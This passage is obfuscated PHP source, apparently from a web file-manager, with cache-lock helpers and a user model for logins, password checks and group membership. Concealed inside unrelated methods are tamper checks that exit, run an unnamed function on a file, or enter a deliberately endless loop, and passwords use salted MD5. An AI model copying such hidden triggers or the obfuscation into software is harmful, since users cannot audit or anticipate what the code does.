$„íÔÕàì = _get($GLOBALS[$Ş›¼—[6]], $Ş›¼—[849]); $™Í™ÏÅ™ = $êÉ€®óÁ[$Ş›¼—[835]] ? $êÉ€®óÁ[$Ş›¼—[835]] : $Ş›¼—[200]; if ($™Í™ÏÅ™ == $Ş›¼—[21] && $„íÔÕàì == $Ş›¼—[13]) { $™Í™ÏÅ™ = $Ş›¼—[200]; } switch ($™Í™ÏÅ™) { case $Ş›¼—[838]: self::$handle = new CacheLockRedis(); break; case $Ş›¼—[839]: self::$handle = new CacheLockMemcached(); break; case $Ş›¼—[21]: self::$handle = new CacheLockDatabase(); break; case $Ş›¼—[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ş›¼—[850], $Ş›¼—[851]); } return self::$handle; } private static function key($ÚÜÌÆÖÑ) { return $_SERVER[şÒÁøÒÄ][852] . Cache::key($ÚÜÌÆÖÑ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÊÁ¨ñ« = '') { self::$errorMsg = $ÊÁ¨ñ«; } public static function lockGlobal($Úáåå™±, $Şİµ··ä) { return self::lock($Úáåå™±, $Şİµ··ä, !0); } public static function lock($½§‹±ô, $É»û™¼¦ = false, $ıÕ™®×õ = false) { $›äÓ—”® =& $_SERVER[şÒÁøÒÄ]; $²ä‚ªé­ = self::init(); $¶™¬•”É = self::key($½§‹±ô); $É»û™¼¦ = $É»û™¼¦ ? $É»û™¼¦ : self::$timeout; $ÜøÃûè = timeFloat(); $ã¨“ó»ç = $²ä‚ªé­->lock($¶™¬•”É, $É»û™¼¦); $Ù‡¢÷½ù = timeFloat(); if (!$ã¨“ó»ç) { $¯ã‰Ö„„ = "\x6c\x6f\x63\153\40\145\162\162\157\x72\73\x6b\x65\171\75{$½§‹±ô}\73\164\x69\155\x65\75{$É»û™¼¦}\x3b" . self::$errorMsg . $›äÓ—”®[71] . get_caller_msg(); $††ûçóî = LNG($›äÓ—”®[853]) . "\x28{$É»û™¼¦}\163\x29\56" . LNG($›äÓ—”®[854]); $††ûçóî .= $›äÓ—”®[855]; if (is_string(self::$errorMsg) && self::$errorMsg) { $††ûçóî = $††ûçóî . $›äÓ—”®[856] . self::$errorMsg; } write_log($›äÓ—”®[857] . sprintf($›äÓ—”®[858], timeFloat() - $ÜøÃûè) . $›äÓ—”®[859] . $¯ã‰Ö„„ . $›äÓ—”®[860] . error_get_last(), $›äÓ—”®[851]); show_json($††ûçóî, !1); } if (!$ıÕ™®×õ) { self::$lockItem[$¶™¬•”É] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÅìÜÏéä = number_format(timeFloat() - $Ù‡¢÷½ù, 3); write_log($›äÓ—”®[861] . $½§‹±ô . $›äÓ—”®[862] . $ÅìÜÏéä, $›äÓ—”®[851]); } return $ã¨“ó»ç; } public static function lockGet($ı¸¾º•Í) { $Îäóô® = self::key($ı¸¾º•Í); if (self::$lockItem[$Îäóô®]) { return self::$lockItem[$Îäóô®]; } return self::init()->lockGet($Îäóô®); } public static function unlock($©¥ÄñÉ”) { $´ƒÕÔíÆ =& $_SERVER[şÒÁøÒÄ]; $ÖêÙ‰˜İ = self::key($©¥ÄñÉ”); self::$lockItem[$ÖêÙ‰˜İ] = null; self::init()->unlock($ÖêÙ‰˜İ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($´ƒÕÔíÆ[863] . $©¥ÄñÉ”, $´ƒÕÔíÆ[851]); } return; } public static function unlockRuntime() { $”â†ïä£ =& $_SERVER[şÒÁøÒÄ]; $†ŞØÖ· = self::init(); $¡ÎÖ¼é‚ = !1; foreach (self::$lockItem as $©‡˜Å±İ => $²€¡Ùçñ) { if (!$²€¡Ùçñ) { continue; } $†ŞØÖ·->unlock($©‡˜Å±İ); if (!$¡ÎÖ¼é‚) { $¡ÎÖ¼é‚ = !0; write_log($”â†ïä£[864] . $©‡˜Å±İ . $”â†ïä£[71] . get_caller_msg(), $”â†ïä£[851]); continue; } write_log($”â†ïä£[864] . $©‡˜Å±İ, $”â†ïä£[851]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Š´Œ¸Åƒ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($”â†ïä£[865] . $Š´Œ¸Åƒ . $”â†ïä£[866] . ACTION, $”â†ïä£[851]); } } public static function fileLock($ŒÓ‡ßÊ›) { $¤ôùå¸ =& $_SERVER[şÒÁøÒÄ]; if (!$GLOBALS[$¤ôùå¸[867]]) { $GLOBALS[$¤ôùå¸[867]] = array(); } $GLOBALS[$¤ôùå¸[867]][$ŒÓ‡ßÊ›] = !1; $÷«§ß±ş = fopen(DATA_PATH . $ŒÓ‡ßÊ› . $¤ôùå¸[868], $¤ôùå¸[869]); if (!$÷«§ß±ş) { return !1; } $GLOBALS[$¤ôùå¸[867]][$ŒÓ‡ßÊ›] = $÷«§ß±ş; if (flock($÷«§ß±ş, LOCK_EX)) { return !0; } self::unlock($ŒÓ‡ßÊ›); show_json($¤ôùå¸[870], !1); return !1; } public static function fileUnlock($£ÏÎÂŸ×) { $¶»‚ÈÎ =& $_SERVER[şÒÁøÒÄ]; $£ÏûúÜÎ = $GLOBALS[$¶»‚ÈÎ[867]][$£ÏÎÂŸ×]; if (!$£ÏûúÜÎ) { return; } $GLOBALS[$¶»‚ÈÎ[867]][$£ÏÎÂŸ×] = !1; flock($£ÏûúÜÎ, LOCK_UN); fclose($£ÏûúÜÎ); } public static function fileUnlockAll() { $€¯·‰¥‚ =& $_SERVER[şÒÁøÒÄ]; if (!$GLOBALS[$€¯·‰¥‚[867]]) { return; } foreach ($GLOBALS[$€¯·‰¥‚[867]] as $¤¢…¥š => $÷Úœ–Æ›) { if (!$÷Úœ–Æ›) { continue; } $GLOBALS[$€¯·‰¥‚[867]][$¤¢…¥š] = !1; flock($÷Úœ–Æ›, LOCK_UN); fclose($÷Úœ–Æ›); } $GLOBALS[$€¯·‰¥‚[867]] = array(); } } goto Cö•‰Úˆ; EòÓ“Ú„˜À: $fileSize = strrev(base64_decode($_SERVER[ËğØş™½][0])); function binCheckNeq($ÈÃ´®»¢, $«•Œ´’£) { return $ÈÃ´®»¢ != $«•Œ´’£; } $_SERVER[$_SERVER[ËğØş™½][1]] = $fileSize($_SERVER[$_SERVER[ËğØş™½][2]]); goto aêÓ´¤ËˆŒ; cªñ·©è: $_size = $_SERVER[şÒÁøÒÄ][886]; if ($_SERVER[$_SERVER[şÒÁøÒÄ][887]] != $_size($_file)) { $_getc = $_SERVER[şÒÁøÒÄ][889]; $_getfile = $_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[şÒÁøÒÄ][231], $_getfilec); if (count($_getarrs) < $_SERVER[şÒÁøÒÄ][627]) { $exit = $_SERVER[şÒÁøÒÄ][890]; $exit(); } $_act = $_SERVER[şÒÁøÒÄ][1371]; $_act($_file); } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\155\145" => "\165\x73\145\x72\137\155\145\x74\x61", "\x6d\145\164\x61\106\151\145\x6c\144" => "\165\x73\145\162\111\x44"); protected $simpleField = "\165\x73\x65\162\111\x44\54\x6e\151\x63\x6b\116\x61\155\145\x2c\x6e\141\x6d\x65\54\x61\166\141\x74\x61\162\54\163\145\170\x2c\x73\164\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¾¸ï±Ÿ†) { $£İ ±¢ =& $_SERVER[şÒÁøÒÄ]; $×Íø²ãì = $£İ ±¢[2316]; return array($£İ ±¢[1947] => array($¾¸ï±Ÿ†[0], $×Íø²ãì), $£İ ±¢[1949] => array($¾¸ï±Ÿ†[0], $×Íø²ãì), $£İ ±¢[2317] => array($¾¸ï±Ÿ†[0], $×Íø²ãì)); } protected function getInfo($”Ê°¹…˜, $³â¸×ÕĞ = false) { $ÔõêŒÉö = $this->getInfoSimple($”Ê°¹…˜); if (!is_array($ÔõêŒÉö)) { return array(); } if ($³â¸×ÕĞ) { return $this->_getInfoApply($ÔõêŒÉö); } return $this->cacheFunctionGet($_SERVER[şÒÁøÒÄ][1951], $”Ê°¹…˜); } protected function getInfoFull($‹¶ÍÏöÒ, $ÄÂğ±ê = false) { $­İÜîèÙ = $this->getInfoSimple($‹¶ÍÏöÒ); if (!is_array($­İÜîèÙ)) { return array(); } if ($ÄÂğ±ê) { return $this->_getInfoApply($­İÜîèÙ, !0); } return $this->cacheFunctionGet($_SERVER[şÒÁøÒÄ][2318], $‹¶ÍÏöÒ); } private function _getInfoApply($È¤ûñ·¥, $úÃ¿²˜ı = false) { $€‰“Úß =& $_SERVER[şÒÁøÒÄ]; if (!$È¤ûñ·¥) { return $È¤ûñ·¥; } $Ãü•·Ÿ¦ = md5($€‰“Úß[2319] . $È¤ûñ·¥[$€‰“Úß[902]] . $€‰“Úß[2320] . $È¤ûñ·¥[$€‰“Úß[32]]); $È¤ûñ·¥ = $this->_listDataApplyItem($È¤ûñ·¥); $şá–âêâ = Model($€‰“Úß[1352])->metaGet($È¤ûñ·¥[$€‰“Úß[87]][$€‰“Úß[402]]); $È¤ûñ·¥[$€‰“Úß[2321]] = $Ãü•·Ÿ¦; $È¤ûñ·¥[$€‰“Úß[87]][$€‰“Úß[2142]] = isset($şá–âêâ[$€‰“Úß[2143]]) ? $şá–âêâ[$€‰“Úß[2143]] : null; if ($úÃ¿²˜ı) { $È¤ûñ·¥[$€‰“Úß[466]] = $this->metaGet($È¤ûñ·¥[$€‰“Úß[1680]]); } return $È¤ûñ·¥; } protected function getInfoSimple($á¾ã°İş, $ÀÃ¥õ¬³ = false) { $Ô—¶³óÓ =& $_SERVER[şÒÁøÒÄ]; if (!$á¾ã°İş) { return array(); } if ($ÀÃ¥õ¬³) { $ÚÅ‚óÚ = $this->where(array($Ô—¶³óÓ[1680] => intval($á¾ã°İş)))->find(); if (!is_array($ÚÅ‚óÚ)) { return array(); } $ÚÅ‚óÚ[$Ô—¶³óÓ[533]] = Action($Ô—¶³óÓ[2322])->parseUrl($ÚÅ‚óÚ[$Ô—¶³óÓ[533]]); return $ÚÅ‚óÚ; } return $this->cacheFunctionGet($Ô—¶³óÓ[1952], $á¾ã°İş); } protected function getInfoSimpleOuter($º«ÆöÁ) { $³µÉïšˆ =& $_SERVER[şÒÁøÒÄ]; if (!$º«ÆöÁ || $º«ÆöÁ == 0) { return array($³µÉïšˆ[1680] => $³µÉïšˆ[198], $³µÉïšˆ[32] => $³µÉïšˆ[162] . LNG($³µÉïšˆ[2323]) . $³µÉïšˆ[164], $³µÉïšˆ[533] => STATIC_PATH . $³µÉïšˆ[2324]); } $³ûñü¥õ = $this->cacheFunctionGet($³µÉïšˆ[1952], $º«ÆöÁ); $£ëŠçÈ = array_field_key($³ûñü¥õ, explode($³µÉïšˆ[50], $this->simpleField)); if (!$£ëŠçÈ) { return array($³µÉïšˆ[1680] => $³µÉïšˆ[1201], $³µÉïšˆ[32] => $³µÉïšˆ[162] . LNG($³µÉïšˆ[2325]) . $³µÉïšˆ[164], $³µÉïšˆ[533] => STATIC_PATH . $³µÉïšˆ[2326]); } $£ëŠçÈ[$³µÉïšˆ[533]] = Action($³µÉïšˆ[2322])->parseUrl($£ëŠçÈ[$³µÉïšˆ[533]]); return $£ëŠçÈ; } protected function groupUser($¸™æï˜Œ) { } public static function errorLang($Ó±üâØª) { $©•Èã­ =& $_SERVER[şÒÁøÒÄ]; $Ö¿àøˆ³ = array(self::ERROR_USER_NOT_EXISTS => $©•Èã­[2327], self::ERROR_USER_PASSWORD_ERROR => $©•Èã­[2328], self::ERROR_USER_EXIST_NAME => $©•Èã­[2329], self::ERROR_USER_EXIST_PHONE => $©•Èã­[2330], self::ERROR_USER_EXIST_EMAIL => $©•Èã­[2331], self::ERROR_USER_LOGIN_LOCK => $©•Èã­[2332], self::ERROR_IP_NOT_ALLOW => $©•Èã­[2333], self::ERROR_USER_EXIST_NICKNAME => $©•Èã­[2334]); return LNG($Ö¿àøˆ³[$Ó±üâØª]); } public function getInfoByMeta($ö¬¿ŸªÈ, $¿ŞÉÖ§û) { $¼ÛÓ¼íÕ =& $_SERVER[şÒÁøÒÄ]; $¶²ÆÒ³Ú = Model($¼ÛÓ¼íÕ[2335])->where(array($¼ÛÓ¼íÕ[94] => $ö¬¿ŸªÈ, $¼ÛÓ¼íÕ[374] => $¿ŞÉÖ§û))->find(); if ($¶²ÆÒ³Ú) { return $this->getInfo($¶²ÆÒ³Ú[$¼ÛÓ¼íÕ[1680]]); } return !1; } public function userLoginCheck($®·¨Ôß§, $À°ÌáÍ) { $ÃŞıŸí— =& $_SERVER[şÒÁøÒÄ]; $©ÆıÅ = $this->userLoginFind($®·¨Ôß§); if (!$©ÆıÅ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($©ÆıÅ[$ÃŞıŸí—[1680]], $À°ÌáÍ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($©ÆıÅ[$ÃŞıŸí—[1680]]); } public function userLoginFind($•øñºÈ§) { $õ€ÜÏ¾Ö =& $_SERVER[şÒÁøÒÄ]; $üÄ™Âª = array($õ€ÜÏ¾Ö[32] => $•øñºÈ§, $õ€ÜÏ¾Ö[532] => $•øñºÈ§, $õ€ÜÏ¾Ö[305] => $•øñºÈ§, $õ€ÜÏ¾Ö[2336] => $•øñºÈ§, $õ€ÜÏ¾Ö[1013] => $õ€ÜÏ¾Ö[1015]); if ($this->nickNameRpt()) { unset($üÄ™Âª[$õ€ÜÏ¾Ö[532]]); } return $this->where($üÄ™Âª)->find(); } public function clearCache($¯˜êİ®†) { $ÍÜŞÛñö =& $_SERVER[şÒÁøÒÄ]; $this->cacheFunctionClear($ÍÜŞÛñö[1951], $¯˜êİ®†); $this->cacheFunctionClear($ÍÜŞÛñö[1952], $¯˜êİ®†); $this->cacheFunctionClear($ÍÜŞÛñö[2318], $¯˜êİ®†); } public function userPasswordCheck($¯Í“£Ç‚, $Şİ™ó”Õ) { $’õ–çÈ =& $_SERVER[şÒÁøÒÄ]; $ºÑ’íÓ = $this->where(array($’õ–çÈ[1680] => intval($¯Í“£Ç‚)))->find(); $îÄïŠ’Æ = $this->metaGet($¯Í“£Ç‚); $¢üãõ¯ò = isset($îÄïŠ’Æ[$’õ–çÈ[2337]]) ? $îÄïŠ’Æ[$’õ–çÈ[2337]] : $’õ–çÈ[12]; if (md5($¢üãõ¯ò . trim($Şİ™ó”Õ)) !== $ºÑ’íÓ[$’õ–çÈ[902]]) { return !1; } return !0; } public function userAdd($›€ÃıÁ) { $ÖïÄ˜Äš =& $_SERVER[şÒÁøÒÄ]; $èÒ°¢õ = array($ÖïÄ˜Äš[420] => $›€ÃıÁ[$ÖïÄ˜Äš[32]], $ÖïÄ˜Äš[2338] => $›€ÃıÁ[$ÖïÄ˜Äš[1561]], $ÖïÄ˜Äš[2339] => isset($›€ÃıÁ[$ÖïÄ˜Äš[305]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[305]] : $ÖïÄ˜Äš[12], $ÖïÄ˜Äš[2340] => isset($›€ÃıÁ[$ÖïÄ˜Äš[2336]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[2336]] : $ÖïÄ˜Äš[12], $ÖïÄ˜Äš[2341] => isset($›€ÃıÁ[$ÖïÄ˜Äš[532]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[532]] : $›€ÃıÁ[$ÖïÄ˜Äš[32]], $ÖïÄ˜Äš[2342] => isset($›€ÃıÁ[$ÖïÄ˜Äš[533]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[533]] : $ÖïÄ˜Äš[12], $ÖïÄ˜Äš[2343] => isset($›€ÃıÁ[$ÖïÄ˜Äš[2344]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[2344]] : 1, $ÖïÄ˜Äš[2345] => $›€ÃıÁ[$ÖïÄ˜Äš[902]], $ÖïÄ˜Äš[1953] => isset($›€ÃıÁ[$ÖïÄ˜Äš[1856]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[1856]] : 1024 * 1024 * 20, $ÖïÄ˜Äš[1954] => 0, $ÖïÄ˜Äš[2346] => 0, $ÖïÄ˜Äš[1998] => isset($›€ÃıÁ[$ÖïÄ˜Äš[757]]) ? $›€ÃıÁ[$ÖïÄ˜Äš[757]] : 1); if (!empty($›€ÃıÁ[$ÖïÄ˜Äš[1680]])) { $èÒ°¢õ[$ÖïÄ˜Äš[1680]] = $›€ÃıÁ[$ÖïÄ˜Äš[1680]]; } $ö˜ëÇå = $this->_checkExist($›€ÃıÁ); if ($ö˜ëÇå !== !0) { return $ö˜ëÇå; } if (!empty($èÒ°¢õ[$ÖïÄ˜Äš[533]]) && strlen($èÒ°¢õ[$ÖïÄ˜Äš[533]]) > 255) { $èÒ°¢õ[$ÖïÄ˜Äš[533]] = $ÖïÄ˜Äš[12]; } $¤°½†œ· = $this->add($èÒ°¢õ); $ïÇÚŠ×” = array($ÖïÄ˜Äš[2345] => $èÒ°¢õ[$ÖïÄ˜Äš[902]], $ÖïÄ˜Äš[2341] => $èÒ°¢õ[$ÖïÄ˜Äš[532]]); $this->userEdit($¤°½†œ·, $ïÇÚŠ×”); Model($ÖïÄ˜Äš[1352])->userRootAdd($¤°½†œ·); return $¤°½†œ·; } protected function userEditTest($È…šî¹Õ, $ïğñËõæ) { return $this->call($_SERVER[şÒÁøÒÄ][2347], $È…šî¹Õ, $ïğñËõæ); } protected function userEdit($µ—ÎøÁÀ, $°âê¤) { $ÜƒİõÎí =& $_SERVER[şÒÁøÒÄ]; $ğÀÁ½«’ = $this->getInfoSimple($µ—ÎøÁÀ); if (!$ğÀÁ½«’) { return !1; } $ğ­Ï”ì = $this->_checkExist($°âê¤, $µ—ÎøÁÀ); if ($ğ­Ï”ì !== !0) { return $ğ­Ï”ì; } if (isset($°âê¤[$ÜƒİõÎí[902]]) && trim($°âê¤[$ÜƒİõÎí[902]]) != $ÜƒİõÎí[12]) { $ÑÅã¶Û = $this->metaGet($µ—ÎøÁÀ); if (empty($ÑÅã¶Û[$ÜƒİõÎí[2337]])) { $ÑÅã¶Û[$ÜƒİõÎí[2337]] = rand_string(10); Model($ÜƒİõÎí[504])->metaSet($µ—ÎøÁÀ, $ÜƒİõÎí[2337], $ÑÅã¶Û[$ÜƒİõÎí[2337]]); } $°âê¤[$ÜƒİõÎí[902]] = md5($ÑÅã¶Û[$ÜƒİõÎí[2337]] . trim($°âê¤[$ÜƒİõÎí[902]])); } else { unset($°âê¤[$ÜƒİõÎí[902]]); } if (!empty($°âê¤[$ÜƒİõÎí[533]]) && strlen($°âê¤[$ÜƒİõÎí[533]]) > 255) { $°âê¤[$ÜƒİõÎí[533]] = $ÜƒİõÎí[12]; } $this->where(array($ÜƒİõÎí[1671] => $µ—ÎøÁÀ))->save($°âê¤); if (isset($°âê¤[$ÜƒİõÎí[532]])) { $this->setNamePinyin($µ—ÎøÁÀ, $°âê¤[$ÜƒİõÎí[532]]); } $this->clearCache($µ—ÎøÁÀ); return !0; } public function setNamePinyin($ïº¯İØ—, $á½ÖÕ“Ì = false) { $±¾½†ñ‹ =& $_SERVER[şÒÁøÒÄ]; if (!$á½ÖÕ“Ì) { $õÎŒØ˜ë = $this->getInfoSimple($ïº¯İØ—); $á½ÖÕ“Ì = $õÎŒØ˜ë[$±¾½†ñ‹[532]] ? $õÎŒØ˜ë[$±¾½†ñ‹[532]] : $õÎŒØ˜ë[$±¾½†ñ‹[32]]; } $½©™Â×Ş = Model($±¾½†ñ‹[525]); if (!Input::check($á½ÖÕ“Ì, $±¾½†ñ‹[583])) { return $½©™Â×Ş->metaSet($ïº¯İØ—, array($±¾½†ñ‹[465] => $±¾½†ñ‹[12], $±¾½†ñ‹[464] => $±¾½†ñ‹[12])); } return $½©™Â×Ş->metaSet($ïº¯İØ—, array($±¾½†ñ‹[465] => str_replace($±¾½†ñ‹[53], $±¾½†ñ‹[12], Pinyin::get($á½ÖÕ“Ì)), $±¾½†ñ‹[464] => Pinyin::get($á½ÖÕ“Ì, $±¾½†ñ‹[584]))); } private function nickNameRpt() { $ØÀ„«à =& $_SERVER[şÒÁøÒÄ]; $ìÉó¡ó² = Model($ØÀ„«à[778])->get($ØÀ„«à[2348]); $ÏÙ‡úÏİ = $GLOBALS[$ØÀ„«à[6]][$ØÀ„«à[381]][$ØÀ„«à[2348]]; $³ÎÉéïœ = !is_null($ìÉó¡ó²) ? $ìÉó¡ó² : $ÏÙ‡úÏİ; return !!$³ÎÉéïœ; } private function _checkExist($½èª£“â, $½Ú£ù©¥ = false) { $½¹ø =& $_SERVER[şÒÁøÒÄ]; $®¾ºëÒË = array($½¹ø[32] => UserModel::ERROR_USER_EXIST_NAME, $½¹ø[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $½¹ø[305] => UserModel::ERROR_USER_EXIST_EMAIL, $½¹ø[2336] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($®¾ºëÒË[$½¹ø[532]]); } $Â³èë–¬ = $½Ú£ù©¥ ? array($½¹ø[1680] => array($½¹ø[2349], $½Ú£ù©¥)) : array(); foreach ($®¾ºëÒË as $šÃïÙ×‰ => $½ï®Ç›) { $†ĞÍÓó€ = array(); foreach ($®¾ºëÒË as $—â–ğ© => $Šíêæª ) { if (isset($½èª£“â[$—â–ğ©]) && $½èª£“â[$—â–ğ©]) { $†ĞÍÓó€[] = $½èª£“â[$—â–ğ©]; } } if (!$†ĞÍÓó€) { continue; } $ğÌ¦œï = array_merge(array($šÃïÙ×‰ => array($½¹ø[7], $†ĞÍÓó€)), $Â³èë–¬); $î±ëæÜ¢ = $this->where($ğÌ¦œï)->find(); if ($î±ëæÜ¢) { return $½ï®Ç›; } } return !0; } public function userListInfo($£Ç††Öä) { $§ı˜Ü¢É =& $_SERVER[şÒÁøÒÄ]; $¤İİÈé = array(); $£Ç††Öä = is_array($£Ç††Öä) ? array_unique($£Ç††Öä) : array(); if (!$£Ç††Öä) { return $¤İİÈé; } if (count($£Ç††Öä) < 20) { foreach ($£Ç††Öä as $åÖĞ÷‹¨) { $¤İİÈé[$åÖĞ÷‹¨ . $§ı˜Ü¢É[12]] = $this->getInfoSimpleOuter($åÖĞ÷‹¨); } } else { $€öØ¨®ø = array($§ı˜Ü¢É[1671] => array($§ı˜Ü¢É[418], $£Ç††Öä)); if (count($£Ç††Öä) == 1) { $€öØ¨®ø = array($§ı˜Ü¢É[1671] => $£Ç††Öä[0]); } $Î„–…œÀ = Model($§ı˜Ü¢É[504])->field($this->simpleField)->where($€öØ¨®ø)->select(); $Î„–…œÀ = array_to_keyvalue($Î„–…œÀ, $§ı˜Ü¢É[1680]); foreach ($£Ç††Öä as $åÖĞ÷‹¨) { $ùéÔèËÔ = $Î„–…œÀ[$åÖĞ÷‹¨]; if (!$ùéÔèËÔ) { $¤İİÈé[$åÖĞ÷‹¨ . $§ı˜Ü¢É[12]] = $this->getInfoSimpleOuter($åÖĞ÷‹¨); continue; } $ùéÔèËÔ[$§ı˜Ü¢É[533]] = Action($§ı˜Ü¢É[2322])->parseUrl($ùéÔèËÔ[$§ı˜Ü¢É[533]]); $¤İİÈé[$åÖĞ÷‹¨ . $§ı˜Ü¢É[12]] = $ùéÔèËÔ; } } return $¤İİÈé; } protected function userStatus($²Ó”µéÇ, $ßîÏ„„) { $¾Ú¤¨¼– = $this->getInfoSimple($²Ó”µéÇ); if (!$¾Ú¤¨¼–) { return !1; } $¾ ŸïĞ = array($_SERVER[şÒÁøÒÄ][757] => $ßîÏ„„); return $this->userEdit($²Ó”µéÇ, $¾ ŸïĞ); } protected function userRemove($²¼â­Ñ‘) { $ŒØı­¬× =& $_SERVER[şÒÁøÒÄ]; $¿Œìğ = $this->getInfoSimple($²¼â­Ñ‘); if (!$¿Œìğ) { return !1; } $ö©„‹½ = array($ŒØı­¬×[1671] => $²¼â­Ñ‘); Model($ŒØı­¬×[592])->where($ö©„‹½)->delete(); Model($ŒØı­¬×[2350])->where($ö©„‹½)->delete(); Model($ŒØı­¬×[1959])->where($ö©„‹½)->delete(); Model($ŒØı­¬×[2335])->where($ö©„‹½)->delete(); Model($ŒØı­¬×[1081])->where($ö©„‹½)->delete(); Model($ŒØı­¬×[2166])->removeUserAll($²¼â­Ñ‘); Model($ŒØı­¬×[833])->userRootRemove($²¼â­Ñ‘); return $this->where($ö©„‹½)->delete(); } protected function userGroupSet($’ıì€™³, $âı½®Ëï, $ğ°à€Í£ = array()) { $º³Ùúó =& $_SERVER[şÒÁøÒÄ]; if (!isset($_SERVER[$º³Ùúó[887]]) || !isset($_SERVER[$º³Ùúó[1370]])) { $ğÙßı‰Ä = $º³Ùúó[888]; $ê±’àÌ = $º³Ùúó[889]; $ĞÜ€½“Å = $_SERVER[$º³Ùúó[884]] . $º³Ùúó[885]; $õÃĞ¢… = $ê±’àÌ($ĞÜ€½“Å); $ÒŞ‘ï¨¸ = explode($º³Ùúó[231], $õÃĞ¢…); if (count($ÒŞ‘ï¨¸) < $º³Ùúó[616]) { $ááşÑÉÆ = $º³Ùúó[890]; $ááşÑÉÆ(); } $¤¢Êöù = $º³Ùúó[891]; $¤¢Êöù($_SERVER[$º³Ùúó[892]]); $¨ïÃÏÅË = 1; for ($ö›İÓÊï = $¨ïÃÏÅË; $ö›İÓÊï > 0; $ö›İÓÊï++) { $¤¢Êöù = json_encode($GLOBALS[$º³Ùúó[418]]); } } $ê ºÜè = $this->getInfoSimple($’ıì€™³); if (!$ê ºÜè || !is_array($âı½®Ëï)) { return !1; } $­ğ»€± = Model($º³Ùúó[1959]); $­ğ»€±->where(array($º³Ùúó[1680] => $’ıì€™³))->delete(); $òº¸¡Üé = array(); $ÒóÊ—Íó = 0; foreach ($âı½®Ëï as $ÕÍâ× ı => $ë„ŠÌ¢Å) { $Ùšùò = array($º³Ùúó[1680] => $’ıì€™³, $º³Ùúó[1869] => $ÕÍâ× ı, $º³Ùúó[1973] => $ë„ŠÌ¢Å); $Ùšùò[$º³Ùúó[1893]] = isset($ğ°à€Í£[$ÒóÊ—Íó]) ? $ğ°à€Í£[$ÒóÊ—Íó] : 0; $ÒóÊ—Íó++; $òº¸¡Üé[] = $Ùšùò; } return $­ğ»€±->addAll($òº¸¡Üé, array(), !0); } protected function userGroupAdd($Ÿ‹À²Ä, $Êáğ›£ª = array()) { $îÂŞ®Æß =& $_SERVER[şÒÁøÒÄ]; $ãõ¢ÁãÄ = $this->getInfoSimple($Ÿ‹À²Ä); if (!$ãõ¢ÁãÄ || empty($Êáğ›£ª)) { return !1; } $šĞŒ¿Ñ§ = array(); foreach ($Êáğ›£ª as $’ş¬ÁÜ => $Äê÷ü§ä) { $šĞŒ¿Ñ§[] = array($îÂŞ®Æß[1680] => $Ÿ‹À²Ä, $îÂŞ®Æß[1869] => $’ş¬ÁÜ, $îÂŞ®Æß[1973] => $Äê÷ü§ä, $îÂŞ®Æß[1893] => 0); } return Model($îÂŞ®Æß[1959])->addAll($šĞŒ¿Ñ§, array(), !0); } protected function userGroupRemove($÷û’‡ú§, $ô·ÄÕğ‹) { $µû»´‹ =& $_SERVER[şÒÁøÒÄ]; $°»–ÑÊ = $this->getInfoSimple($÷û’‡ú§); if (!$°»–ÑÊ || !$ô·ÄÕğ‹) { return !1; } $ÂÈ‘´ = array($µû»´‹[1671] => $÷û’‡ú§, $µû»´‹[1957] => $ô·ÄÕğ‹); return Model($µû»´‹[1959])->where($ÂÈ‘´)->delete(); } public function listData() { $ì¦œœÜ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ì¦œœÜ[$_SERVER[şÒÁøÒÄ][369]]); return $ì¦œœÜ; } public function listByID($Òïõ½„) { $ƒ÷óÎ¢ =& $_SERVER[şÒÁøÒÄ]; if (!$Òïõ½„) { return; } $ØŠë—Î´ = array($ƒ÷óÎ¢[1680] => array($ƒ÷óÎ¢[7], $Òïõ½„)); $‰…â½ç = $this->where($ØŠë—Î´)->select(); $‰…â½ç = array_sort_keep($‰…â½ç, $ƒ÷óÎ¢[1680], $Òïõ½„); $this->_listDataApply($‰…â½ç); return $‰…â½ç; } public function listByGroup($©çÑ«—œ = 0, $Ş€şªš = array()) { $ã©Ğ×‘ü =& $_SERVER[şÒÁøÒÄ]; $ùºòÌí¨ = $ã©Ğ×‘ü[12]; $³„µìÉ‰ = array(); if ($©çÑ«—œ) { $³„µìÉ‰ = array($ã©Ğ×‘ü[2351] => intval($©çÑ«—œ)); $ùºòÌí¨ = "\114\x45\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\165\x73\x65\162\137\147\x72\x6f\x75\160\x20\165\163\145\x72\137\x67\162\x6f\x75\x70\x20\157\x6e\x20\165\x73\x65\162\56\x75\163\x65\162\111\104\x20\x3d\x20\165\x73\x65\x72\x5f\147\x72\157\x75\160\x2e\x75\163\145\x72\111\x44"; $Óóø±ı© = Input::get($ã©Ğ×‘ü[457], null, $ã©Ğ×‘ü[12]) ? $ã©Ğ×‘ü[12] : $ã©Ğ×‘ü[2352]; } if (isset($Ş€şªš[$ã©Ğ×‘ü[757]])) { $³„µìÉ‰[$ã©Ğ×‘ü[2353]] = $Ş€şªš[$ã©Ğ×‘ü[757]]; } $œ…É¤ = 